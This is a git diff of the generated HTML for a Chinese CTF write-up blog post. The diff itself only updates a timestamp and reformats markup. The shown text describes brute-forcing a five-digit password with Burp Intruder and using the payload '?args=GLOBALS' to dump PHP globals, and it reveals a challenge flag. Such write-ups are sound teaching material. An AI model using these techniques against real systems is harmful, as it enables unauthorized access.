@@ -106,7 +106,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/burpbaopo.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webweizao1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webweizao2.PNG">
-<meta property="og:updated_time" content="2017-10-03T08:41:29.637Z">
+<meta property="og:updated_time" content="2017-10-03T08:42:55.500Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="若干web">
 <meta name="twitter:description" content="burp 爆破 题目页面提示爆破 且为五位数密码  burp抓包 Send to Intruder 点击Positions 先点右侧 clear $ 清除所有变量  然后在你想爆破的位置点两个 Add $  再到Payloads 先试试纯数字  再到 Options下  Number of threads 代表线程数 Number of retries on network 代表如果出现连接错误或">
@@ -394,7 +394,7 @@
 <p>$GLOBALS是由所有已定义全局变量自动形成的数组。变量名就是该数组的索引</p>
 <p>payload：?args=GLOBALS </p>
 <p>即可爆出所有变量，其中包含flag</p>
-<p>`array(7) { [“GLOBALS”]=&gt; <em>RECURSION</em> [“_POST”]=&gt; array(0) { } [“_GET”]=&gt; array(1) { [“args”]=&gt; string(7) “GLOBALS” } [“_COOKIE”]=&gt; array(0) { } [“_FILES”]=&gt; array(0) { } [“ZFkwe3”]=&gt; string(38) “flag{92853051ab894a64f7865cf3c2128b34}” [“args”]=&gt; string(7) “GLOBALS” }</p>
+<p><code>array(7) { [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) { } [&quot;_GET&quot;]=&gt; array(1) { [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { } [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag{92853051ab894a64f7865cf3c2128b34}&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; }</code></p>
 
       
     </div>
